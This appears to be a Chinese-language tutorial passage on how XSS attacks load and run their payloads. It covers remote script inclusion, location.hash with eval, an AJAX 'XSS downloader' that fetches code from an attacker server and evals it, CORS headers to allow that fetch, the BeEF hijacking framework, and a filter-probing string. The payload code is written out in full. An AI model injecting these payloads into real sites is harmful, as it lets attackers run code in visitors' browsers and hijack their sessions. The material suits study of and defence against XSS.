#### shellcode的调用

shellcode就是利用漏洞所执行的代码，完整的xss攻击会将shellcode存放在一定的地方，然后漏洞触发，调用shellcode

1. 远程调用js

   将js代码单独放在一个文件夹内，存放在一个可以网络访问到的服务器上，通过http协议远程加载该脚本，如：

   `<script src="IP地址/XSS-TEST/normal/xss.js"></script>`

   这是最常见的方式，XSS.JS代码内容：`alert('xss.js');`

2. windows.location.hash

   我们也可以使用js中的windows.location.hash方法获取浏览器的URL地址栏的XSS代码，windows.location.hash会获取URL中 # 后面的内容，例如`http://domain.com/index.php#AJEST`，windows.location.hash的值就是#AJEST

   构造的代码如下：

   `?submit=submit&xsscode=<script>eval(location.hash.substr(1))</script>#alert(/This is windows.location.hash/)`，提交到测试页面xss.php

3. XSS downloader

   XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。在使用XSS Downloader之前需要一个我们自己的页面，xss_downloader.php，内容如下：

   `~~~~BOF|alert(/xss/)|EOF~~~~~~~~~~（波浪线代替html代码）`

   常见的下载器代码如下：

   `<script>
   function XSS() {
   	if (window.XMLHttpRequest) {
   		a = new XMLHttpRequest() ;
   	}else if (window.ActiveXObject) {
   		a = new ActiveXObject( "Microsoft.XMLHTTP");
   	else {return;}
   	a.open('get',' http://IP/目录/xss_downloader.php',false) ;
   	a.send() ;
   	b=a.responseText;
   	eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));}
   XSS() ;
   </script>`

   - 注意：Ajax 受同源策略的限制，为了解决这个问题，我们需要在服务端代码中加入几句代码：

     `<?php`

     `header ('Access-Control-Allow-Origin: *') ;`

     `header ('Access-Control-Allow-Headers: Origin, X-Requested-with， Content -Type，Accept') ;`

     `?>`

4. 备选存储技术

   我们可以把shellcode存储在客户端本地域中，比如HTTP cookie、flash共享对象、userdata、localstorage等

5. XSS神器，beef，是一款XSS漏洞利用平台，使用beef可以进行浏览器劫持

XSS测试，终极测试代码：`<script script "' OOnn>`，将代码提交到服务器验证是否过滤引号和尖括号，确定闭合方式，是否替换关键字，是否替换大小写。查看页面源代码后判定修改代码